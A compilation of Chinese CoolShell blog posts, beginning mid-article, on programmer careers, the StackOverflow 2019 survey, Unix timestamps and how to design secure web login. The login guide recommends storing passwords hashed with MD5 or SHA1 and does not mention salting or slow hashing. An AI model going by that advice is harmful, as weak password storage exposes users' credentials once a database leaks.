P.S. 我虽然这么说，但从我个人来说，我非常理解微信为了让用户有很好的体验而不让微信成为一个四处都是营销商品的地方。所以，我从个人来说，希望微信不要成为一个商家的营销地。另外，我也知道阿里对移动端的看重，所以，上述的方案虽然对用户体验和安全都比较好，但是从目前商业利益的情况看来基本无法实现。不过我这里也只是抛砖引玉了。面对安全和用户这两个事， **你们两个中国最大的互联网公司，应该带头做好榜样，你们都是不缺钱的公司，应该更多的承担起社会的责任，真正为用户做点什么，而不是整天想着流量入口，互相屏蔽，互相指责，想着自己能有多少用户，这TMD太LOW了，和你们的地位完全不符。所以，从站在用户的角度上来说，我希望微信和淘宝都能站在用户的角度上思考问题，一起合作来真正的为用户更好的服务。**（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 计算机专业学生的大学生活作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面看到某国外的同学描述的自己的大学生活，呵呵。做一下解释，
* 正常的生活是，10点到17点上课，17点到22点是放松和work（chill相当于relax），22点到凌晨1点是社交活动，然后睡8小时。   * 计算机专业的学生的生活是，只要你脑子还在转就work，脑子不转了，就睡2小时。（ ~~原来，国外的计算机大学的同学们在大学时就已在疯狂工作了，课都不上~~ ）（work是在校的学术作业项目（谢谢网友rho指正））!计算机专业学生的大学生活计算机专业学生的大学生活不过，看了一下上面的代码，我发现了两个问题：1. sleep(2)，在posix下是秒，在windows下是毫秒。   2. (hour >= 22 && hour < 1) 这个表达式永假。正确的是(hour >= 22 || hour < 1)当然，我们并不能下结论——该同学的在学校里并没有学好编程。因为，你不知道Sleep 和 && 有没有被重载了。（你要把&&在某些情况下重载成||的行为也不是不可能 。 **注：在c++中，你无法重载内建类型的操作符** ）——————最后说明一下，最近事太多（一个项目要上线，另一个项目需求分析和设计、招聘、酷壳服务器迁移、带孩子、申请签证、给人做培训），所以没有更新，大家见谅。
# StackOverflow 2019 程序员调查作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前些天，StackOverflow 发布了 2019年的年度程序员调查，这个调查报查有90000名程序员参与，这份调度报告平均花了20分钟，可见，这份报告有很多的问题，也是很详细的。这份报告有一些地方，让我有了一些思考。首先，我们先来看一下之份报告的 Key Results：* Python 成为了过去一年中成长最快的语言，把Java挤到了第二位，排在后面的是Rust语言。   * 有半数以上的被访者在是在16岁写下自己的第一行代码。   * DevOps Specialists 和 Site Reliability Engineers 是程序员中最有经验，技术最牛，薪资最好的职位。（这对应于国内的——系统架构师）   * 在几个头部的程序员大国中，中国的程序员最乐观的，他们相信在今天出生的人会有比他们父母更好的人生。对于欧洲的程序员来说，比较法国和德国的程序员，他们对未来并不太乐观。   * 对于最影响程序员生产力的事，不同的程序员有不同的想法。
#### 第一部分，Developer Profile在第一部分中，我们可以看到，中国程序员参与这个调查的并不多，程序员主要集中在美国、欧洲、印度这三个地方。所以，这份报告更偏国际上一些。这对于我们中国程序员也有很大的帮助，因为一方面可以看到世界发展的趋势，另一方面也可以了解我们和世界有什么不一样。对于技术职业来说，整个世界的程序员开始趋于全栈和后端，有51.9%的人是全栈，50%的人是后端，32.8%的人是前端……在这些人中，很多程序员都选了多项，中位数是3项，最常见是前端、后端和全栈全选的。然后，接下来是选两项的，选两项目的包括：数据库管理员和系统管理员，DevOps Specialist 和 Site Reliablility Engineer， 学术研究者和科学家，设计师和前端工程师。从这些数据中我们可以看见： **前后端的界限越来越不明显，设计师和前端的界限也开始模糊。这应该说明，工具和框架的成熟，让后端程序员和设计师也可以进入到前端工程师的领域，或是前端工程师开始进入后端和设计的领域** 。总之，复合型人才越来越越成为主流，而前后端也趋于一个相互融合的态势。在接下来的图表中，我们可以看到有80%以上的人是把编程当成自己的爱好（包括相关的女性）。
真是应了那句话——“Programmers who don’t code in their spare time for fun will never become as good as those that do”，是的，如果你对编程没有感到一种快乐，没有在你空闲的时候去以一种的兴趣爱好方式去面对，那么，无论是编程，还是运动，还是去旅游，都不会有太多成效的。在接下来的编程经验上，有两组如下的数据：学习编程的年限 | 编程的年限   ---|---    |我们可以看到无论是学习还是编程，随着时间的拉长，其人数占比越来越少。下面我们再来看一个年龄图：调查报告从20岁开始每隔5年划分一个年龄段，我们不难发现从25-29岁开始每个年龄段都比前一个年龄段人数急剧减少大约30-50%，比如25-29年龄段占总人数27.6%，而30-34则只有19.3%。以此类推，到60岁以上，就只剩1%。可以看出5年是大多数程序员的转型周期。这是合理的，因为5年时间足够一个人积累足够的经验技能为职业转型做准备。我们也可以看到50岁以上的程序员只有4.2%，大约是参与调查人员的300多人，如果这些人20岁左右参加工作，那么说明他们在1990左右就开始写代码，事实上那个时间点别说是程序员了，连电脑用户都不多。 **电脑和互联网真正暴发的时间还是在1995年 – 2000年之间，不过，那个时间点程序员的总体人数也不多，而行业越来越火才会导致大量的人进入到这个行业中，这个转换过程基本上去需要3-5年，也就是从2000年后才开始有大量的人拥入程序员这个行业，程序员的人数在过去30年间也是呈增涨态势的，所以，我个人认为，所谓的“众多老程序员”的比例会被2005年以后大量拥入程序员行业的年青人所“稀释”。所以，上图的比例不能完全说明程序员是个青春饭** 。
但是，我们还是要正视老牌资深的程序员越来越少的这个事实，在这份报告第三部分中说了一些和程序员职业生涯相关的调查，如下：* **在被问到有多少人对自己的职业满意的时** 。有40%的人觉得很满意，而有34.3%的人觉得一般满意，有10%的人说不清，还有15%的人是不满意的。可以看到有不少人是对这个职业生涯是有想法的。   * **在被问到有多少人想转管理而可以挣得更多时** 。有30%的人是说想转的，有51%的人是明确不转的，还有20%的人是说不知道。可见，想转管理的人最多可能会有一半的人。   * **在被问到有多少人想转管理时** 。有1/3的人是明确不想转的，而有1/4的人是明确是想转，而有36%的人则是不说，观望中。可见，的确是有很多想想转管理的。**我们可以看到，程序员中并不是所有的人都是可以坚持这么长时间的，这也挺正常的，对很大一部分人来说，对这个职业是有或多或少的不满意的，也有一部分人可能会随着技术的更新被淘汰，还有另外很大一部分人是想转管理的。所以，能够长时间地跟上形势长时间地喜欢写代码，并且对程序员这个的职业长期满意，不想转管理的，的确是为随时年龄的越大也越来越少** 。
**但我们完全可以看出来，程序员的主力军在20-40岁这个区间，而30岁左右的程序员是年富力强（经验和能力都很好）的黄金时间** 。老程序员在国外似乎不会存在多大的问题，但在国内会有一些问题，所以，对于像我一样喜欢写代码、打算长久做程序员的兄弟，这里分享一些相关的经验。1. **持续高效地学习** 。软件行业的新技术层出不穷，旧的技术淘汰很快，所以我们更要多多学习基础技术和原理，那些都是很难改变的，并且基础扎实了后，学习新的技术也才会更快速。其间我们也不要乱学新技术，我们要关注那些有潜力的技术，也就看准了再学（参看酷壳的《Go语言、Docker和新技术》）。注意，而是跟上大时代已经比较不容易，引领时代的人还是少数，所以，还是要更为高效地学习。   2. **积极面对他人的不解** 。 很多时候，总是会有人说：“到了你这个年纪怎么还在做程序员？”，这句话感觉就是对程序员这个职业的一种羞辱，社会的价值观感觉容不下大龄程序员。这个时候，我一般会跟他们解释到，我40来岁了，我觉得自己的状态还很好，工作完成没什么问题，偶尔加班到凌晨也行，新知识和技术我学起来不比年轻人慢，我在这个年纪有的经验比他们都多，而且，我这个年纪还在写代码，说明我真的喜欢这个事， **像我这样的人能够长时间坚持做一个职业的人这个世界已经不多了，你们应该珍惜……**   3. **找到自己的定位** 。我们需要做好职业规划、财务和心理方面的准备。40岁的程序员，所能竞争的一定是自己的认识和经验，所以，40岁以后如果你还是很喜欢这一行业，你的社会阅历和经历以及对这个社会的理解，可以让你做一些有创新的事，除此之外，你还可以做一个教练、老师、咨询、专家……，用你的经验和能力帮助下一代和一些中小型的公司，这不但是他们的刚需，同时也会让重新焕发的。
#### 第二部分，技术首先，在这部分，主要是了解一些技术，这部分的技术可以给于程序员们一些指导。最流行的语言 | 最热门的语言   ---|---    |我们可以看到，* Javascript/HTML/CSS是很多人都会用到的，后面的是SQL，这个也没什么问题，无论前后端的人，或多或少都会要用到的，这些技术感觉已经成为了基础必会的技术了，就像数中的加减乘除一样。   * Python/Java/Shell 是后端开发主流语言的前三强，Python在今年超过了Java。这里让我比较好奇的是居然还有很多人用Shell，这估计跟运维有关，所以，Python的热可能也是通过运维和大数据相关。   * 流行语言后，第二梯队的是 C# / PHP / C++ / TypeScript / C ，接下来的是： Ruby / Go / Swift / Kotlin /WebAssembly / Rust… 。但在最被程序员喜欢的编程语言中：Rust / Python / TypeScript / Koltin / WebAssembly / Swift / Go… 都是排在前几名的。 **程序语言每隔一段时间就会整出一些新的语言来，我们一定要明白新出来的东西主要是为了解决什么样的问题，不然很容易迷失。**   * 在后面还有一个编程语言的薪资图，我们可以看到，在上面被提过的这些个编程语言中， **Go语言的薪资是最高的（这可能是因为Go语言写关键的系统级的中件间——因为Go语言正在成为云计算的第一编程语言）** ，然后是Scala、Ruby、WebAssembly、Rust、Erlang、Shell、Python、Typescript……
**通过这些个信息，我们可以看出主流技术、有潜力的技术，传统过气技术，以及相关薪资，对我们在选择编程语言上有一定的启示。**在后面，我们可以看到:* 在 Web 开发框架上，主流使用还是 jQuery, React.js，Angular.js 为最前面的三个前端开发框架。而被程序员所喜欢的则是 React.js，Vue.js，Express, Spring，程序员非常不喜欢 Drupal，jQuery，Ruby on Rails 和Angular.js……   * 在其它开发框架/库/工具上，主流是Node.js、.NET、Pandas、Unity 3D、Tensorflow、Ansible、Cordova、Xamarin……而程序员比较喜欢的是.NET、Torch/PyTorch、Flutter、Pandas、Tensorflow、Node.js …   * 在操作系统上，主流使用Linux、Windows、Docker、Android、AWS……，而程序员最喜欢的是Linux、Docker、Kubernetes、Raspberry Pi、AWS、MacOS、iOS……   * 在数据库上，MySQL、PostgreSQL、MSSQL、SQLite、MongoDB、Redis、Elasticsearch是比较主流的，而程序员非常喜欢的是，Redis、PostgreSQL、Elasticsearch、Firebase、MongoDB……，程序员比较讨厌的是 Couchbase、Oracle、Cassandra、MySQL。
**从这些个图表中，我们可以看到主流和有潜力的技术是什么，我们可以看到 Windows 的技术并没有过时，感觉似乎都有可能会卷土重来，但是，开源的技术来势凶凶，正在吞食整个软件业，不容小觑，Docker/Kubernetes无论是在主流应用上还是被程序员的喜好上都是非常猛的，而云平台的AWS开始成为标准平台技术……**接下来的开发工具中，我们可以看到：* Visual Studio Code 成为了最流行的开发工具。让我没有想到的是跟在后面的是 Notepad++（好久没用这个工具了，我得找回来用用了），而IntelliJ、Vim、Sublime Text排以后面。 Eclipse 和 Atom 动力不足，Emacs 开始变得小众了。   * 程序员主要的开发平台还是Windows占了近1/2， MacOS和Linux随后，各占1/4。   * 有38%的人使用容器技术做开发，30%的人使用容器做测试，在生产线上使用容器的有26%**看样子编程开发工具还是Visual Studio 和 IntelliJ的天下，MacOS/Linux正在抢Windows的开发市场**接下来，StackOverflow给了一个技术圈的图
从上面这个图中，我们可以看以技术的几圈子：* **Microsoft圈** – Windows、.NET、ASP.NET、C#、Azure、SQL Server   * **Java圈** – Java、Spring   * **手机圈** – Android、 iOS、Kotlin、Swift、Firebase   * **前端圈** – Javascript、React.js、Angular.js、PHP   * **大数据圈** – Python、TensorFlow、Torch/PyTorch   * **基础平台圈** – Linux、Shell、Vim、Docker、Kubernetes、Elasticsearch、Redis……   * **其它圈子** – C/C++/汇编圈子、Ruby圈子、Hadoop/Spark圈子、……**看到谁的圈子大了吧，圈子大的并不代表技术实力强或是有前途，不过可以代表在那个圈子相关的关联技术，一方面，可以给你一些相关的参考，另一方面，整体可以让你看到全部的目前比较主流的技术。**#### 第三部份 工作在第三部份工作中，我们可以看到如下的一些数据：
* 有3/4的程序员是全职的，10%左右的程序员是自由职业，6%左右的程序员是失业的，这个比例在北美、印度和欧洲都差不多。   * 有1/3的人在过去一年内换过工作，1/4的人在过去1-2年间换过工作，1/3的人在2-4年换过工作。   * 程序员找工作时，影响程序员的几个主要因素是：技术（编程语言、框架和使用的技术）、办公环境和公司文化、灵活的时间和安排、更专业的机会、远程工作……   * 影响程序员工作的几大因素是：有干扰的工作环境、开会、要干一些和开发无关的事、人手不够、管理不够、工具不够、通勤时间……   * 对于工程质量，有近70%的人有Code Review，而30%的则没有；有60%多的人有Unit Test，而不到40%的没有……**从工作中我们可以看到，程序员还是比较关心技术和公司文化的，换工作也是这个职业很正常的特性，他们并不喜欢被打扰，希望有足够的时间，而对于工程质量还是很有追求的。**最后用一张程序员的“ **每周工作时间** ” 来结束本文！祝大家快乐！（全文完）# 提高编程技能最有效的方法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
StackExchange.com上有两个贴子（贴子一，贴子二），贴子名叫“What is the single most effective thing you did to improve your programming skills?” – 对你的编程技术提高最有效的一件事是什么？回复的人中给了很多很不错的建议，我把他们总结了一下，十条，相信一定会对你有用。（注意：顺序是我自己按我的个人经验排的）* 和比自己聪明的能力比自己强的人工作。学习他们的代码，他们的做事方法，看一看那些人是怎么处理错误的。* 总是倾听别人怎么说，无论那个的资历和职位是什么样的。* 实践，实践，实践，总是不满意于一开始出来的事。* 多问问自己，现在在写什么代码？为什么要这样写成这样？还有没有更好的方法？* 学习多样的技术，多多比较他们，并一定要了解各种技术的优缺点。* 总是问别人问好的问题。* 多回头看看走过的路，做过的事，写过的程序，感觉一下他们有多烂。* 多读读那些大师写的书。* 不要总坐在电脑前编程序，多做做运动，多到户外走走，和非技术人多接触，向他们学习。* 把你的想法说出去，看看别人怎么回应的。从别人的回应中学习。
除了这些，下面是我个人想给你的建议——可能只能算精神，不能算方法。我以前也写过《五个方法成为更好的程序员》，《十条不错的编程观点》，还有《优秀程序员的十个习惯》这几篇文章也能给你一些启发。* **热情** 。对编程充满热情。这种热情会导致强烈地专研精神，和努力的精神。 **专研精神相当重要，它是畏难情绪的天敌** 。* **知道** 。学习技术要“知其道，明其理”，而不仅仅只是了解知识。举例，为什么C++有“初始化例表”而Java却没有？为什么Java的没有多重继承？为会有了TCP还要UDP？对于一个事物，什么是好的，什么是不好的。不但要了解其表面，还要了解其思想。 **只有了解原始的初衷和目的，你才能真正“知道”** 。* **犯错** 。不犯错误永远没有经验，从自己的错误和别人的错误中学习，只有自己犯了错，才会真正明白。犯错不可怕，可怕的是不会总结只有真正的摸爬滚打过的人才是强人。 **技能和经验总是用错误去换来的** 。* **回顾** 。要多去回顾过去，看看历史上发生过的事。这样你才能明白事物的发展规律，从面才能了解未来的路。举例：单机 -> Client/Server -> 中间应用层 -> 多层结构 -> 分布式结构。 C -> C++ -> Java，等等，等等。 **未来其实就在回顾过去之中** 。
* **质疑** 。质疑精神很重要。质疑通常会导致不同意见甚至反对意见。也许你会质疑错，也许你会被质疑，但是你的认知也会因为不同的观点而变得完整。有所同有所不同（“同”为同意及相同）， **观点因为不同才能迸发出火花，事物也此而发展，世界因为不同而精彩** 。（全文完）# 在上班的时候浏览不相干网页作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn相信大家在上班的时候都要去浏览很多与工作无关的网页，但总是害怕被同事尤其是老板看到，所以，你总是会有个“老板键”什么的。当有人从你身边经过的时候，你会很快速地切换你的桌面屏幕，让人看到你还在干与工作有关的事情了。现在，一个具有创意的天才解决方案出来了——为什么不把这些与工作无关的网站的样子都变成和工作相关呢？这里有一个示例，真让人拍案叫绝。不知道大家知不知道一个叫的网站？这个网站上都是一些“令人难堪”的小笑话，很多是荤的笑话，而有另一个网站是：——这个网站就是fmylife的翻版，唯一不同的是，它把fmylife.com伪装成了一个Java 2 Platform SE v1.42的技术文档（请注意这个文档中的函数解释的内容），于是你就可以在上班的时候大胆地浏览fmylife.com上的内容了，因为那看起来就像在看Java的API文档。呵呵。
!Java Doc版的fmlife.com# 时间1234567890作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn“At 11:31:30pm UTC on Feb 13, 2009, Unix time will reach 1,234,567,890.   Where will you be at this momentous second?” – from **Bell Labs**在下周五或周六的某一时间，计算机的时间戳（TimeStamp）为变成奇妙的1234567890，而这一天就是——格林威治时间：2009年2月13日 11:31:30 。当然，因为这个时间在地球上某些地方是13日，某些地方是14日，不同的时区可能会不一样。不过，你可以使用Unix/Linux 下的Perl运行一下这个命令你就知道你的当地时间了。perl -e ‘print scalar localtime(1234567890),”\\\n”;’对于中国GMT+8（东八区）的时间如下：2009年2月14日 早上7点31分30秒，你会在这一时刻干什么？你会在某个地方做点什么事庆祝一下吗？或是你会因为今天是情人节而在这个时间给你的爱人发个短信吗？呵呵。
不过，西方某些迷信的还懂编程的朋友们开始显得有点焦虑，因为那天就是传说中的“黑色星期五”（13日星期五）。嘿嘿。接下来是“科普教育”，名词解释1）时间戳：从1970年1月1日 00:00:00 以来的秒数。2）Y2K38：因为在Unix下，time_t 被定义成signed int，所以，有符号的32位整型本身有限(2147483647)，某一天这个整型为高位为一（负数），而这一个时间是——格林威治时间2038年1月19日03:14:07 。# 你会做Web上的用户登录功能吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnWeb上的用户登录功能应该是最基本的功能了，可是在我看过一些站点的用户登录功能后，我觉得很有必要写一篇文章教大家怎么来做用户登录功能。下面的文章告诉大家这个功能可能并没有你所想像的那么简单，这是一个关系到用户安全的功能，希望大家能从下面的文章中能知道什么样的方法才是一个好的用户登录功能。 **以下内容，转载时请保持原文一致，并请注明作者和出处** 。目录* 用户名和口令   * 用户登录状态   * 找回口令的功能   * 口令探测防守   * 参考文章
#### 用户名和口令首先，我们先来说说用户名和口令的事。这并不是本站第一次谈论这个事了。如何管理自己的口令让你知道怎么管理自己的口令，破解你的口令让你知道在现代这样速度的计算速度下，用穷举法破解你的口令可能会是一件很轻松的事。在这里我想告诉从开发者的角度上来做设计这个用户名和口令的事。下面一几件规则：* **限制用户输入一些非常容易被破解的口令** 。如什么qwert，123456, password之类，就像twitter限制用户的口令一样做一个口令的黑名单。另外，你可以限制用户口令的长度，是否有大小写，是否有数字，你可以用你的程序做一下校验。当然，这可能会让用户感到很不爽，所以，现在很多网站都提供了UX让用户知道他的口令强度是什么样的（比如这个有趣的UX），这样可以让用户有一个选择，目的就是告诉用户——要想安全，先把口令设得好一点。* **千万不要明文保存用户的口令** 。正如如何管理自己的口令所说的一样，很多时候，用户都会用相同的ID相同的口令来登录很多网站。所以，如果你的网站明文保存的话，那么，如果你的数据被你的不良员工流传出去那对用户是灾难性的。所以，用户的口令一定要加密保存，最好是用不可逆的加密，如MD5或是SHA1之类的有hash算法的不可逆的加密算法。CSDN曾明文保存过用户的口令。（另，对于国内公司的品行以及有关部门的管理方式，我不敢保证国内网站以加密的方式保存你的口令。我觉得，做为一个有良知的人，我们应该加密保存用户的口令）
* **是否让浏览器保存口令** 。我们有N多的方法可以不让浏览器保存用户名和口令。但是这可能对用户来说很不爽。因为在真实世界里谁也记得不住那么多的口令。很多用户可能会使用一些密码管理工具来保存密码，浏览器只是其中一种。是否让浏览器保存这个需要你做决定，重点是看一下你的系统的安全级别是否要求比较高，如果是的话，则不要让浏览器保存密码，并在网站明显的位置告诉用户——保存口令最安全的地方只有你的大脑。* **口令在网上的传输** 。因为HTTP是明文协议，所以，用户名和口令在网上也是明文发送的，这个很不安全。你可以看看这篇文章你就明白了。要做到加密传输就必需使用HTTPS协议。但是，在中国还是有很多网站的Web登录方式还在使用ActiveX控件，这可能成为IE6还大量存在的原因。我通常理解为这些ActiveX控件是为了反键盘记录程序的。 不过，我依然觉ActiveX控件不应该存在，因为在国外的众多安全很重要的站点上都看不到ActiveX的控件的身影。#### 用户登录状态首先，我想告诉大家的是，因为HTTP是无状态的协议，也就是说，这个协议是无法记录用户访问状态的，其每次请求都是独立的无关联的，一笔是一笔。而我们的网站都是设计成多个页面的，所在页面跳转过程中我们需要知道用户的状态，尤其是用户登录的状态，这样我们在页面跳转后我们才知道是否可以让用户有权限来操作一些功能或是查看一些数据。
**所以，我们每个页面都需要对用户的身份进行认证** 。当然，我们不可能让用户在每个页面上输入用户名和口令，这会让用户觉得我们的网站相当的SB。为了实现这一功能，用得最多的技术就是浏览器的cookie，我们会把用户登录的信息存放在客户端的cookie里，这样，我们每个页面都从这个cookie里获得用户是否登录的信息，从而达到记录状态，验证用户的目的。但是，你真的会用cookie吗？下面是使用cookie的一些原则。* **千万不要在cookie中存放用户的密码** 。加密的密码都不行。因为这个密码可以被人获取并尝试离线穷举。所以，你一定不能把用户的密码保存在cookie中。我看到太多的站点这么干了。* **正确设计“记住密码”** 。这个功能简直就是一个安全隐患，我觉得并不是所有的程序员都知道怎么设计这个事。一般的设计 是——一时用户勾选了这个功能，系统会生成一个cookie，cookie包括用户名和一个固定的散列值，这个固定的散列值一直使用。这样，你就可以在所有的设备和客户上都可以登录，而且可以有多个用户同时登录。这个并不是很安全。下面是一些更为安全的方法供你参考：   （—— _ **更新 2011/08/26，原文中有些小错误，并且说的不清楚，重新调整了一下——**_ ）
1）在cookie中，保存三个东西—— **用户名** ， **登录序列** ， **登录token** 。**用户名** ：明文存放。   **登录序列** ：一个被MD5散列过的随机数，仅当强制用户输入口令时更新（如：用户修改了口令）。   **登录token** ：一个被MD5散列过的随机数，仅一个登录session内有效，新的登录session会更新它。2）上述三个东西会存在服务器上，服务器的验证用户需要验证客户端cookie里的这三个事。3）这样的设计会有什么样的效果，会有下面的效果，a） **登录token** 是单实例登录。意思就是一个用户只能有一个登录实例。b） **登录序列** 是用来做盗用行为检测的。如果用户的cookie被盗后，盗用者使用这个cookie访问网站时，我们的系统是以为是合法用户，然后更新“ **登录token** ”，而真正的用户回来访问时，系统发现只有“ **用户名** ”和“ **登录序列** ”相同，但是“ **登录token** ” 不对，这样的话，系统就知道，这个用户可能出现了被盗用的情况，于是，系统可以清除并更改 **登录序列** 和 ****登录token**** ，这样就可以令所有的cookie失效，并要求用户输入口令。并给警告用户系统安全。
4）当然， **上述这样的设计还是会有一些问题，比如：同一用户的不同设备登录，甚至在同一个设备上使用不同的浏览器保登录** 。一个设备会让另一个设备的 **登录token** 和 **登录序列** 失效，从而让其它设备和浏览器需要重新登录，并会造成cookie被盗用的假象。所以，你在服务器服还需要考虑- **IP 地址** ，a) 如果以口令方式登录，我们无需更新服务器的“ **登录序列** ”和 “ **登录token** ”（但需要更新cookie）。因为我们认为口令只有真正的用户知道。b) 如果 **IP相同** ，那么，我们无需更新服务器的“ **登录序列** ”和 “ **登录token** ”（但需要更新cookie）。因为我们认为是同一用户有同一IP（当然，同一个局域网里也有同一IP，但我们认为这个局域网是用户可以控制的。网吧内并不推荐使用这一功能）。c) 如果 （ **IP不同** && **没有用口令登录** ），那么，“ **登录token** ” 就会在多个IP间发生变化（登录token在两个或多个ip间被来来回回的变换），当在一定时间内达到一定次数后，系统才会真正觉得被盗用的可能性很高，此时系统在后台清除“ **登录序列** ”和“ **登录token** “，让Cookie失效，强制用户输入口令（或是要求用户更改口令），以保证多台设备上的cookie一致。
* **不要让cookie有权限访问所有的操作** 。否则就是XSS攻击，这个功能请参看新浪微博的XSS攻击。下面的这些功能一定要用户输入口令：1）修改口令。2）修改电子邮件。（电子邮件通常用来找回用户密码，最好通发邮件或是发手机短信的方式修改，或者干脆就不让改一一用电子邮件做帐号名）3）用户的隐私信息。4）用户消费功能。* **权衡Cookie的过期时间。** 如果是永不过期，会有很不错的用户体验，但是这也会让用户很快就忘了登录密码。如果设置上过期期限，比如2周，一个月，那么可能会好一点，但是2周和一个月后，用户依然会忘了密码。尤其是用户在一些公共电脑上，如果保存了永久cookie的话，等于泄露了帐号。所以，对于cookie的过期时间我们还需要权衡。#### 找回口令的功能找回口令的功能一定要提供。但是很多朋友并不知道怎么来设计这个功能。我们有很多找回口令的设计，下面我逐个点评一下。* **千万不要使用安全问答** 。事实证明，这个环节很烦人，而且用户并不能很好的设置安全问答。什么，我的生日啊，我母亲的生日，等等。因为今天的互联网和以前不一样了，因为SNS，今天的互联比以前更真实了，我可以上facebook，开心，人人网，LinkedIn查到你的很多的真实的信息。通过这些信息我可以使用安全问答来重设你的口令。 这里需要说一下 Facebook，Facebook的安全问答很强大，还要你通过照片认人，呵呵。
* **不要重置用户的密码** 。因为这有可能让用户的密码遭到恶意攻击。当然，你要发个邮件给用户让其确认，用户点击邮件中的一个链接，你再重置。我并不推荐这样的方法，因为用户一般都会用笔记下来这个很难记的口令，然后登录系统，因为登录系统时使用了“记住密码”的功能，所以导致用户不会去修改密码，从而要么导到被写下来的密码被人盗取，要么又忘记了密码。* **好一点的做法——通过邮件自行重置** 。当用户申请找回口令功能的时候，系统生成一个MD5唯一的随机字串（可通过UID+IP+timestamp+随机数），放在数据库中，然后设置上时限（比如1小时内），给用户发一个邮件，这个连接中包含那个MD5的字串的链接，用户通过点击那个链接来自己重新设置新的口令。* **更好一点的做法——多重认证** 。比如：通过手机+邮件的方式让用户输入验证码。手机+邮件可能还不把握，因为手机要能会丢了，而我的手机可以访问我的邮箱。所以，使用U盾，SecureID（一个会变化的6位数token），或是通过人工的方式核实用户身份。当然，这主要看你的系统的安全级别了。#### 口令探测防守* **使用验证码** 。验证码是后台随机产生的一个短暂的验证码，这个验证码一般是一个计算机很难识别的图片。这样就可以防止以程序的方式来尝试用户的口令。事实证明，这是最简单也最有效的方式。当然，总是让用户输入那些肉眼都看不清的验证码的用户体验不好，所以，可以折中一下。比如Google，当他发现一个IP地址发出大量的搜索后，其会要求你输入验证码。当他发现同一个IP注册了3个以上的gmail邮箱后，他需要给你发短信方式或是电话方式的验证码。
* **用户口令失败次数** 。调置口令失败的上限，如果失败过多，则把帐号锁了，需要用户以找回口令的方式来重新激活帐号。但是，这个功能可能会被恶意人使用。最好的方法是，增加其尝试的时间成本（以前的这篇文章说过一个增加时间成本的解密算法）。如，两次口令尝试的间隔是5秒钟。三次以上错误，帐号被临时锁上30秒，5次以上帐号被锁1分钟，10次以上错误帐号被锁4小时……但是这会导致恶意用户用脚本来攻击，所以最好再加上验证码，验证码出错次数过多不禁止登录而是禁lP。* **系统全局防守** 。上述的防守只针对某一个别用户。恶意者们深知这一点，所以，他们一般会动用“僵尸网络”轮着尝试一堆用户的口令，所以上述的那种方法可能还不够好。我们需要在系统全局域上监控所有的口令失败的次数。当然，这个需要我们平时没有受到攻击时的数据做为支持。比如你的系统，平均每天有5000次的口令错误的事件，那么你可以认为，当口令错误大幅超过这个数后，而且时间相对集中，就说明有黑客攻击。这个时候你怎么办？一般最常见使用的方法是让所有的用户输错口令后再次尝试的时间成本增加。最后，再说一下，关于用户登录，使用第三方的 OAuth 和 OpenID 也不失为一个很不错的选择。
#### 参考文章* OWASP Guide To Authentication   * Dos and Don’ts of Client Authentication on the Web （PDF）   * Charles Miller’s Persistent Login Cookie Best Practice   * Wikipedia: HTTP cookie   * Personal knowledge questions for fallback authentication: Security questions in the era of Facebook（ **以上内容，转载时请保持原文一致，并请注明作者和出处** ）# 程序员需要具备的基本技能作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn软件开发是一个跨度很大的技术工作，在语言方面，有C，C++，Java，Ruby等等等等，在环境方面，又分嵌入式，桌面系统，企业级，WEB，基础系统，或是科学研究。但是，不管是什么的情况，总是有一些通用的基本职业技能。这些最基本的职业技能通常决定了一个程序员的级别，能否用好这些技能，直接关系到了程序员的职业生涯。很多程序新手也是因为缺少、达不到或是不熟悉在这些基本技能，所以，他们需要有老手带，需要努力补齐这些技能。而高级程序员应该非常熟悉这些基本技能，而且有能力胜任并带领其他经验不足的程序员。
下面这些基本职业技术可以用来做为对一个程序员的评估，很明显，下面的这些技能都可以用来做面试。虽然，还有很多非技术的因素，但对于评估一个程序员的技术能力来说，其应该是足够的了。下面是程序员所应该具备的基本职业技能：基本技能 | 技能描述   ---|---   阅读代码 | 这个技能需要程序员能够具备读懂已经存在的代码的能力，这样的能力可以让程序员分析程序的行为，了解程序，这样才能和开发团队一起工作，继承维护或是改进现有的程序。   编写程序 | 编写程序并不包括程序设计。不要以为编程是一件很简单的事情，很多程序员都认为编程只需要懂得程序语言的语法，并把设计实现就可以了。但是这离编写程序还远远不够，使用什么样的编码风格成为编写程序员最需要具备的基本技能。能否使用非常良好的编程风格直接决写了程序员的级别。   软件设计 | 这一能力直接决定了需要吏用什么样的代码技术达到怎么样的功能，而系统架构设计直接决定了软件的质量、性能和可维护性。并不是所有的程序在这一方面都非常优秀，但每个程序员都需要或多或少的明白和掌握这一基本技能。   熟悉软件工程 | 每个程序员都应该明白软件工程是什么东西，都应该知道，需求分析，设计，编码，测试，Release和维护这几个阶段。当然，几乎所有的人都知道这些东西，但并不是每个人都很清楚这些东西。现在很多高级程序员都会混淆“需求规格说明书FS”和“概要设计HLD”。另外，程序员还需要知道一些软件开发的方法论，比如：敏捷开发或瀑布模型。   使用程序库或框架 | 一个程序员需要学会使用已有的代码，无论是标论的程序库，或是第三方的，还是自己公司内部的，都需要学会做。比如：C++中，需要学会使用STL，MFC，ATL，BOOST，ACE，CPPUNIT等等。使用这些东西，可以让你的工作事半功倍。   程序调试 | 程序调试是分析BUG和解决问题最直接的能力。没有人能够保证程序写出来不用调试就可以运行正常，也没有人可以保证程序永远不会出BUG。所以，熟练使用调试器是一个程序员需要具备的基本技能。   使用IDE | 学会使用IDE工具也会让你的工作事半功倍。比如，VC++，Emacs，Eclipse等等，并要知道这些IDE的长处和短处。   使用版本控制 | 一定要学会使用版本控制工具，什么叫mainline/trunk，什么叫tag，什么叫branch，怎么做patch，怎么merge代码，怎么reverse，怎么利用版本控制工具维护不同版本的软件。这是程序员需要明的的软件配置管理中最重要的一块。   单元测试 | 单元测试是每个程序都需要做的。很多单元测试也是需要编码的。一定要学会在xUnit框架下进行单元测试。比如JUnit, NUnit, CppUnit等等。   重构代码 | 每个程序员都需要有最基本的能力去重构目前已有的代码，使代码达到最优但却不能影响任何的已有的功能。有一本书叫《软件的重构》，每个程序员都应该读一下。   